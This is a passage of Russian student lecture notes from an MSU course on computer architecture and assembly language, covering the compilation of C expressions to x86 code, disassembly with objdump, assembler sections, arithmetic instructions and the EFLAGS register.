определены пять переменных, которые должны создаваться каждый раз при вызове
функции. Поэтому адреса этих переменных нужно соотносить с некоторым динамически
определяемым адресом, в вычислении которого участвует один из регистров:

    X       ebp-16
    y       ebp-12
    z       ebp-8
    w       ebp-4
    q       ebp-1


   Сборка программы происходит по схеме, указанной на рис. 3.1.
   При вызове программы через командную строку или графическую среду разработки,
эта программа через себя вызывает целую цепочку других программ в определённой
последовательности. Эти программы связаны между собой через вход и выход программы.
Препроцессор обрабатывает полученный код (на языке Си), находит директивы по
включению других заголовочных файлов в которых определены типы и собирает весь
Си-код, который должен быть скомпилирован. После этого включается компилятор,
который смотрит на описание функций и типов и строит ассемблерный листинг.
   Рассмотрим объявление и инициализацию переменной:
\int x=z;
результат выполнения си-компилятора:
mov dword [epb -16] ,2
Далее программа ассемблер транслирует такую текстовую форму в двоичное
представление:
c7 45 f0 02000000
Такую форму записи уже принимает машина, однако прежде чем эти байты сохранятся
в процессор, пройдет еще несколько этапов (программа собирается не мгновенно, а
частями, за что отвечает компоновщик).
   На прошлой лекции мы остановились на рассмотрении шестой строчки кода:
void f() {
    static int cntr = 0;                 // 1



                                        31
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 3.1: Иллюстрация к объяснению

     int x = 2, y = 1, z = 0;    // 2
     unsigned short w = 282;    // 3
     signed char q = 13;       // 4
     ++ cntr ;                // 5
     z = -x + q * w *y - w; // 6
}
Листинг, выданный ассемблером для данной функции, будет иметь вид:
...
mov dword [ebp -16] , 2                    ;   (1)
mov dword [ebp -12] , 1                    ;   (2)
mov dword [ebp -8] , 0                     ;   (3)
mov word [ebp -4] , 282                    ;   (4)
mov byte [ebp -1] , 13                     ;   (5)
add dword [ cntr ], 1                      ;   (6)
movsx eax , byte [ebp -1]                  ;   (7)


                                                 32
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




movzx edx , word [ebp -4]                            ;   (8)
imul eax , edx                                       ;   (9)
imul eax , dword [ebp -12]                           ;   (10)
sub eax , dword [ebp -16]                            ;   (11)
sub eax , edx                                        ;   (12)
mov dword [ebp -8] , eax                             ;   (13)
...
   Современные компиляторы заточены на то, чтобы перестраивать код так, чтобы он
работал максимально быстро. Форма представления преобразования данных каких-то
выражений удобна для восприятия человеком, но не для восприятия машиной. Поэтому
в компиляторе есть свои специализированные представления, с которыми он работает.
Эти представления условно можно разделить на две группы: то, что строится в начале
и то, что строится потом для анализа. Построим дерево, которое будет соответствовать
вычислению рассматриваемого выражения (рис. 3.1).

                                                         =

                                             z                   +


                                                         -                -


                                                 x                    *           w


                                                             *                y

                                                 q                w

                                  Рис. 3.2: Иллюстрация к вычислению выражения

   Язык Си предполагает, что если прописана некоторая операция, то в подавляющем
большинстве случаев она принимает на вход величины одного типа и ведает на выходе
величину такого же типа. Однако в указанном дереве вычислений мы имеем листья
разных типов. Поэтому компилятор будет делать неявное приведение типов. Изменим
дерево следующим образом (рис. 3.3). Учтем, что w – беззнаковая переменная и
приводить ее к типу,в котором она сможет гарантированно храниться, нужно одним
способом, который мы назовем U. Переменная q – знаковая. Ее старший разряд будет
интерпретироваться как степень двойки с минусом. Преобразование над этой переменной
обозначим S.
   После того, как данная конструкция попадет к компилятору, она будет перестроена
в соответствии с внутренними критериями компилятора. В результате получим дерево,


                                                                 33
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                                                    =

                                        z                       +


                                                        -                   -
                                                                                    U

                                                x                   *               w


                                                            *                   y
                                                        S            U
                                            q                    w

                                  Рис. 3.3: Иллюстрация к объяснению


изображенное на рис. 3.4. Унарный минус будет отброшен. Отметим, что в данном дереве
имеются два одинаковых поддерева (на рис. 3.4 они обведены).

                                                                =

                                                    z                       -
                                                                                    U

                                                                 -                      w



                                                            *                   x


                                                *                       y
                                            S               U
                                   q
                                                        w



                                  Рис. 3.4: Иллюстрация к объяснению

   В листинге ассемблера, в седьмой строчке, чтобы получить на выходе (после
умножения) переменную типа int, нужно рассматривать переменные того же типа.
Для этого нужно преобразовать один байт в четыре байта. На прошлой лекции мы
рассмотрели команду пересылки данных move, которая умеет поразрядно пересылать
данные. Однако здесь нам нужно добавить еще разрядов. Для этого используют команду
MOVSX, которая расширяет один битовый вектор из второго операнда до вектора большего
размера.



                                                                34
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




MOVSX R \ frac {16}{32} , r/m 8
      R 32 , r/m 16
       𝑠
ОП1 ←− ОП2

   Поэтому, если в переменной q старший (седьмой) разряд – 0, то при пересылке в
регистр eax все остальные 24 разряда тоже будут 0. Если старший разряд – 1, то он
копируется по всем остальным 24 старшим разрядам, так, чтобы в дополнительном коде
мы снова получили то же отрицательное число.
   Восьмая строка представляет собой аналогичную операцию с небольшими отличиями.
Величину, забранную из переменной w, отправляет в регистр edx и расширяет
беззнакковым образом.
   Теперь можем перейти к умножению. Двухадресная команда умножения целых чисел
представляется в виде:
imul R \ frac {16}{32} , r/m \ frac {16}{32}
   ОП1 ←− ОП1 ∗ ОП2

    Аспекты, присущие команде сложения, справедливы и для вычитания.
    Рассмотрим двенадцатую строку. Воспользуемся тем, что регистров достаточное
количество, поэтому та часть поддерева, которую мы считаем и запоминаем в регистре eax
(команда (9)-(12)) также находится и в edx. Поэтому, не проводя повторное расширение,
можно произвести вычисление.
    Таким образом, строчки, которые соответствуют вычислениям дерева, можно
обозначить на рис. 3.5.
    Тринадцатая команда (пересылка) фиксирует побочный эффект выполнения
присвоения (все, что мы посчитали, должно обновить значение переменных).
    Программа может собираться из нескольких модулей. Поэтому, пока мы не
видим, весь объем программы, из чего она будет собрана, трудно решить, по каким
адресам нужно располагать статические переменные. Поэтому ассемблер сгенерирует
дополнительную служебную информацию, которая будет описывать, что нужно сделать
в отношении доопределения адресов.
    После того, как программа будет собрана целиком, она отправляется на исполнение.
Отдельная программа загрузчик будет копировать содержимое файла в определённые
адреса памяти, после чего управление передается в некоторый адрес и начинается
исполнение.


Обратный путь
   Рассмотрим обратный путь – от исполняемого кода к читаемому тексту. В Linux
есть пакет Binutils, который позволяет работать с двоичными файлами. Рассмотрим


                                         35
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                                                                    13
                                                           =

                                                                   12
                                                 z                       -
                                                                                 U
                                                          11
                                                               -                 w

                                                     10
                                                      *                      x
                                         9

                                             *                     y
                                   7     S            U
                                                               8
                                   q
                                                     w



                                  Рис. 3.5: Иллюстрация к объяснению


следующую ситуацию. Текстовый файл, в котором был листинг отдельной функции,
транслировали и перевели в модуль с перемещаемым объектным кодом.
snoop@earth :~/ samples$ nasm -f elf -o sample1 .o sample1 .asm
snoop@earth :~/ samples$ objdump -M intel -d sample1 .o
Здесь ключ -d означает дизассемблировать содержимое данного файла, ключ -M
intel – хотим получить текстовую выдачу согласно синтаксису intel. Эта программа
просматривает содержимое указанного файла и переводит двоичную запись в текстовую.
В результате получим:
0: 55                                                 push          ebp
1: 89 e5                                              mov           ebp , esp
3: 81 ec 10 00 00 00                                  sub           esp ,0 x10
9: c7 45 f0 02 00 00 00                               mov           DWORD PTR [ebp -0 x10 ] ,0 x2
10: c7 45 f4 01 00 00 00                              mov           DWORD PTR [ebp -0 xc ] ,0 x1
17: c7 45 f8 00 00 00 00                              mov           DWORD PTR [ebp -0 x8 ] ,0 x0
1e: 66 c7 45 fc 1a 01                                 mov           WORD PTR [ebp -0 x4 ] ,0 x11a
24: c6 45 ff 0d                                       mov           BYTE PTR [ebp -0 x1 ] ,0 xd
28: 81 05 00 00 00 00 01                              add           DWORD PTR ds :0x0 ,0 x1
2f: 00 00 00
32: 0f be 45 ff                                       movsx             eax , BYTE PTR [ebp -0 x1]
36: 0f b7 55 fc                                       movzx             edx , WORD PTR [ebp -0 x4]
3a: 0f af c2                                          imul              eax , edx
3d: 0f af 45 f4                                       imul              eax , DWORD PTR [ebp -0 xc]



                                                          36
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




41: 2b 45 f0                         sub   eax , DWORD PTR [ebp -0 x10 ]
44: 29 d0                            sub   eax , edx
46: 89 45 f8                         mov   DWORD PTR [ebp -0 x8], eax
49: c9                               leave
4a: c3                               ret
    Самый левый столбец – смещение двоичной записи от начала функции (мы начали
с какой-то команды, которая лежит по нулевому смещению от начала функции). Видно,
что первая команда была однобайтовая, вторая команда лежит по смещению один, она
двубайтового размера. Со смещения 9 начинается код, который мы разбирали выше. 28
смещение соответствует сложению.


Устройство ассемблерной программы
   Рассмотрим верхнюю ветку сборки программы, то есть тот ассемблерный код,
который мы пишем сами, транслируем его в то, что представляет перемещаемый
объектный код.
% include 'io . inc '

 section . data
  a dw 1
  addr dd $
  var dd 0 x1234F00D

section . bss
  cntr resd 1

section . text
global CMAIN
CMAIN :
    add dword [ cntr ], 1
    mov eax , [ addr ]
    PRINT_HEX 4, eax
    NEWLINE
    PRINT_HEX 4, addr
    NEWLINE
    xor eax , eax
    ret
   Пусть есть некоторый текстовый файл, который состоит из некоторого количества
секций. Далее эти секции будут преобразованы в двоичное содержимое плюс некоторая


                                       37
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




служебная информация. При этом перевод текстовой формы в двоичную запись
выполняется ассемблером достаточно просто. Каждая строка – это либо текстовая запись
какой-то команды, либо директива, которая диктует ассемблеру, что делать. Начало
секции обозначается ключевым словом section, после него – имя секции. Основные
секции, с которыми мы будем работать: .data, .bss, .text. Первые две секции –
статические данные. В секции .text располагается программный код.
   В секции .text записаны некоторые команды. Перед ними могут быть метки. Таким
образом, можно записать
                                метка: КОП ОП1,...

Где КОП – код операции, ОП – операнд. Метки в коде требуются, когда нужно явно менять
порядок выполнения команд.
   Рассмотрим определение переменных:

                                  имя-переменной [:]директива; комментарий

То, что указано, в квадратных скобках, может быть записано опционально (то есть
необязательная запись).
   В секции .data директивы могут быть следующими: db val1 [,val2, ...] –
определяем один байт
dw – определяем 16-разрядное (слово)
dd – определяем 32-разрядную информацию
dq – определяем 8 байт

    Здесь val1 [,val2, ...] – значения, которые должны появиться в указанном месте памяти.
    Достаточно часто мы хотим что-то изначально инициализировать нулём. Возникает
вопрос: нужно ли в этом случае этот ноль хранить? Ответ – нет. В случае секции .data при
наличии одной из указанных директив действительно нужно генерировать некоторую
байтовую последовательность, которую потом из текстовой формы переводим в
двоичную запись и сохраним внутри файла. Применительно же к секции .bss, в которой
хранятся переменные, инициализируемые нулями, хранение такого содержимого не
нужно. Нужно будет только в составе служебной информации записать, что суммарно
под секцию .bss потребуется какое-то общее пространство (которое учитывает эти нули).
Отличие директив в данном случае будет в следующем: resb – определяем один байт
resw – определяем 16-разрядное (слово)
resd – определяем 32-разрядную информацию
resq – определяем 8 байт
Далее, в зависимости от директивы вводим какое-то число N, которое указывает, сколько
раз мы хотим выделить памяти в указанном количестве.




                                                    38
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Пример заполнения секции .data
   Рассмотрим память работающей программы, куда после всех преобразований должна
попасть секция data, будучи скопированной из общей программы (рис. 3.6). Первый
байт соотносится с именем переменной а. Знак $ означает, что в данное место нужно
подставить текущий адрес. Однако, при трансляции текстового файла в двоичную запись
мы ещё не знаем этот адрес. Поэтому про это место нужно сделать запись в служебный
код. Поэтому пока что место под запись адреса (addr) остаётся пустым.

                                  a       addr             var

                                  01 00                0D F0 34 12

                                      Рис. 3.6: Иллюстрация к примеру

   Пусть известно, что после сборки программы секцию .data разместили на некоторый
базовый адрес, например на 0x7000000. Теперь мы можем доопределить четыре байта,
которые были выделены под адрес. Учтем, что в пустых клетках должен быть адрес места,
которое относится к указанной директиве. В итоге получим (рис. 3.7):

                                      a     addr           var

                                      01 00 02 00 00 07 0D F0 34 12


                                      Рис. 3.7: Иллюстрация к примеру



Секция .text
   Рассмотрим секцию .text:
section . text
global CMAIN
CMAIN :
    add dword [ cntr ], 1
    mov eax , [ addr ]
    PRINT_HEX 4, eax
    NEWLINE
    PRINT_HEX 4, addr
    NEWLINE
    xor eax , eax
    ret



                                                      39
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Аналогично section – ключевое слово. После него – имя.text. Далее указывается
конструкция global CMAIN (чтобы указать данную конструкцию, необходимо в начале
включить некоторые дополнительные директивы), которая указывает точку входа. Далее
идет метка CMAIN, команда сложения, пересылка и четыре команды, позволяющие
выводить на печать значения реестров в памяти. Последние две команды соотносятся в
языке Си с return (возвращает некоторый целочисленный код, по которому можно понять,
хорошо отработала программа или нет). Строка ret позволяет выйти из функции.


Основные арифметические команды
   • MOV – пересылка

   • MOVSX, MOVZX – пересылка с расширением

   • ADD, SUB

   • INC, DEC – команды быстрой арифметики

   • NEG

            – r/m 8/16/32

   • MUL

            – r/m 8/16/32

   • IMUL

            – r/m 8/16/32
            – r 16/32, r/m 16/32
            – r 16/32, r/m 16/32, i 16/32

   • DIV, IDIV

            – r/m 8/16/32

   • CBW, CWD, CDQ

   INC – одноадресная команда (работает с одним операндом):
                                                       8
                                                       16
                                             𝑖𝑛𝑐 𝑟/𝑚
                                                       32
                                            ОП ← ОП + 1




                                                 40
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Команда DEC:
                                                                8
                                                               16
                                                    𝐷𝐸𝐶 𝑟/𝑚
                                                        32
                                                ОП ← ОП − 1

   Следующая одноадресная команда – обращение знака:
                                                                8
                                                    𝑁 𝐸𝐺 𝑟/𝑚 16
                                                             32
                                                    {
                                                         −𝑥, 𝑥 > −2𝑤−1
                                        −𝑡𝑤 (𝑥) =
                                                        −2𝑤−1 , 𝑥 = −2𝑤−1
   Здесь t означает, что число представлено в двойном дополнительном коде некоторой
разрядности w (то есть в числе w разрядов).
   Рассмотрим новую форму команды умножения – MUL – умножение с расширением
результата. Если операнд 8-разрядный, то результат будет записываться в регистр AX,
причем мы берем от него младший байт, умножаем на операнд и получившееся значение
записываем в 16 разрядов:

                                       𝑀𝑈 𝐿 𝑟/𝑚 8 : 𝐴𝑋 ← 𝐴𝐿 ∗ ОП

В случае 16 разрядов:

                                    𝑀𝑈 𝐿 𝑟/𝑚 16 : 𝐷 𝑋 : 𝐴𝑋 ← 𝐴𝑋 ∗ ОП

В случае 32 разрядов:

                                  𝑀𝑈 𝐿 𝑟/𝑚 32 : 𝐸 𝐷 𝑋 : 𝐸 𝐴𝑋 ← 𝐸 𝐴𝑋 ∗ ОП

Отметим, что данное умножение трактует битовые вектора как беззнаковые числа
(вследствие расширения).

   Пример. Умножим два 8-разрядных числа.

                                         0𝑥𝐹𝐹 ∗ 𝑈
                                                8 0𝑥𝐹𝐹 → 0𝑥𝐹𝐸01                                              (3.1)

   Также существует команда IMUL, у которой три формы допустимых форматов.
Первая форма совпадает с тем, что было для беззнакового умножения. В этом случае при
умножении тех же величин, что в примере выше, получим

                                         0𝑥𝐹𝐹 ∗ 𝑡8 0𝑥𝐹𝐹 → 0𝑥0001                                             (3.2)



                                                          41
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Существует третий допустимый формат, который предполагает возможность явного
указания константы в виде третьего операнда. В этом случае

                                               ОП1 ← ОП2 ∗ ОП3

   Отметим, что в двухадресной форме не может быть константы в качестве второго
оператора.

   Рассмотрим команды деления DIV и IDIV. В случае заранее надо определить, знаковые
величины или беззнаковые.
                                                                   8
                                                                  16
                                                  𝑖𝐷 𝐼𝑉 𝑟/𝑚
                                                                  32
                                                                   8
                                                                  16
                                                  𝐷𝐼𝑉 𝑟/𝑚
                                              32
При этом при работе с 8-байтовым операндом, мы изначально берем величину, которая
по разрядности больше делителя в два раза. Далее мы в одной команде выполняем сразу
две операции:

                                       𝐴𝑋/ОП → 𝐴𝐿 частное, 𝐴𝐻 остаток

   Операция деления довольно сложная. Например, если на сложение приходится один
такт, то на деление – порядка двадцати или даже больше в зависимости от реализации.

   В случае 16-разрядного операнда:

                                     𝐷 𝑋 : 𝐴𝑋/ОП → 𝐴𝑋 частное, 𝐷 𝑋 остаток

В случае 32-разрядного операнда:

                                  𝐸 𝐷 𝑋 : 𝐸 𝐴𝑋/ОП → 𝐸 𝐴𝑋 частное, 𝐸 𝐷 𝑋 остаток

   В случае знакового деления существует группа команд:

                                                              𝑠
                                                𝐶𝐵𝑊 𝐴𝑋 ← 𝐴𝐿
                                                                       𝑠
                                              𝐶𝑊 𝐷 𝐷 𝑋 : 𝐴𝑋 ← 𝐴𝑋
                                                                           𝑠
                                           𝐶𝐷𝑄 𝐸 𝐷 𝑋 : 𝐸 𝐴𝑋 ← 𝐸 𝐴𝑋




                                                       42
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 4. Регистр EFLAGS.
Регистр EFLAGS
   Основная компонента, которой мы будем пользоваться, чтобы влиять на ход
выполнения – это служебный регистр флагов, который находится в управляющем
устройстве и запоминает в себе некоторые состояния вычислений, которые происходили
при выполнении арифметических и других операций. Например, мы выполнили
сложение, получили некоторый результат. Тогда определённые свойства этого результата
будут отражаться в указанном регистре. Регистры общего назначения мы рассматривали
как битовые вектора, несущие в себе интерпретацию целых или положительных
чисел. Регистры флагов следует рассматривать как некоторую совокупность отдельных
устройств хранения информации и отдельные разряды или отдельные биты выражают то
или иное свойство прошедших вычислений или результата. Сам регистр 32-разрядный
(рис. 4.1). Далеко не все разряды несут в себе некоторую информацию (свойств модем
быть меньше разрядов). Поэтому часть разрядов всегда равна нулю. Первый разряд
всегда равен 1.




                                  Рис. 4.1: Регистр EFLAGS

   На рис. 4.1 фиолетовым цветом выделено то, что относится к функциям управления.
Зеленый и синий флаги управляют ходом выполнения некоторых команд, которые
позволяют работать с байтовыми строками. Флаг AF относится к так называемой
двоично-десятичной арифметике. Помимо десятичного представления чисел, когда
битовый вектор рассматривается как коэффициенты перед степенями двойки, существуют
другие форматы представления чисел. Когда-то был довольно популярен формат двоично
закодированных десятичных чисел (сокращенно BCD). пусть есть один байт. Этот байт
делится на две части – каждые четыре бита могут закодировать число от 0 до 15, то есть
их вполне достаточно, чтобы закодировать одну десятичную цифру.

   Пример.
В привычном для машины виде число преобразуется в

                                    1610 = 1016 = 100002

   Однако, если закодировать указанное число по принципу, описанному выше, получим


                                            43
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




совсем друга представление. Если закодировать 1, получим: 0001, а для 6: 0110.


Арифметические FLAGи
   Рассмотрим FLAG чётности (PF) (второй разряд). В этом разряде взводится 1, если в
младшем байте результата, который мы получили при вычислении предыдущей команды,
четное количество единиц. Например, мы выполнили сложение, получили некоторое
число 00010110. Здесь три единицы, то есть число нечетное, значит, флаг PF должен быть
сброшен в ноль. Отметим, что само число четное, хотя флаг четности сбрасывается в 0.
   Флаг ZF взводится в случае нулевого результата.
   Флаг SF отвечает за знак результата. Например, рассмотрим некоторое положительное
число. Его старший разряд – ноль, тогда и SF – 0. Если же число отрицательное, SF
взводится.
   Флаг CF – перенос за разрядную сетку. Например, мы осуществляем сложение.
Если числа достаточно большие, то нам уже не хватит того числа разрядов, с которым
мы работали. То есть, получаем ситуацию беззнакового переполнения. Эта ситуация и
запоминается в указанном флаге. Таким образом, если мы наткнемся на переполнение, мы
сможем узнать об этом по состоянию флага. Ситуацию переполнения мы будем получать
достаточно часто при условии работы с числами, значения которых произвольны и
равномерно распределены по всему диапазону представимых чисел.


Переполнение при сложении двух беззнаковых чисел
   Рассмотрим числовую матрицу (рис. 4.2).
   Числа, которые складываются по 4 разряда x и y пробегают значения от 0 до
15 каждый. Тогда, если цвет клетки белый, то результат представим и не возникает
проблем с переполнением. Если же клетка оранжевого цвета, значит складываемые
величины слишком большие и результат сложения не входит в четыре разряда (ситуация
переполнения).
   В трехмерном случае ситуацию переполнения можно представить в виде,
представленном на рис. 4.3. Диагональ – граница представимых результатов. Отметим,
что картина будет иметь один и тот же вид для разного числа разрядов. Так, на рис. 4.3
слева изображен график в случае 3-ч разрядов, а справа – в случае четырех.


FLAG OF
   Вернемся к рассмотрению флагов. Флаг OF – знаковое переполнение. Формально оно
записывается следующим образом: перенос за разрядную сетку XOR перенос в старший
разряд. Данная ситуация соответствует случаю сложения знаковых чисел при условии,
что результат представить нельзя. Для машины нужен некоторый алгоритм, который



                                          44
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 4.2: Числовая матрица




                                  Рис. 4.3: Переполнение в 3D


описывает, что конкретно нужно делать с какими-то отдельными разрядами.

   Пример.
Пусть есть некоторые битовые вектора, которые мы складываем. Пусть старшие
разряды этих векторов были нулевые. Однако произошел перенос в старший разряд из
предпоследнего (рис. 4.4). В результате получим ситуацию переполнения – сложили два
положительных числа, а получили отрицательное.
   Опишем знаковое переполнение с графической точки зрения. Рассмотрим числовую
матрицу для случая сложения двух знаковых чисел (рис. 4.5). Учтем, что число знаковое,
поэтому начало координат будет в центре. Правый верхний квадрант – положительные


                                              45
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




числа, в нем ситуация аналогична рассмотренному выше случаю для беззнаковых чисел.
В противоположной стороне получаем отрицательное переполнение. Отметим, что
суммарная площадь зоны переполнения в два раза меньше, чем в рассмотренном выше
случае с беззнаковым переполнением.

                                               1

                                           0 .. ........................
                                           0 .. ......................
                                        0 1 ... ..........

                                           0
                                       Рис. 4.4: Иллюстрация к примеру




                            Рис. 4.5: Переполнение при сложении двух знаковых чисел

   Отметим, что все флаги обновляются одновременно. То есть, машина не знает, как мы
трактуем битовые вектора, живущие в регистрах или в памяти (рассматриваем мы их как
знаковые величины или как беззнаковые). На основе значений этой группы флагов можно
попросить машину сделать то или иное изменение порядка команд.


Изменение естественного порядка выполнения программы
   На рис. 4.6 представлена таблица, первый столбец которой – адреса, следующий
столбец – соответствующий машинный код, последний столбец – текстовая запись
ассемблерных инструкций.



                                                         46
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
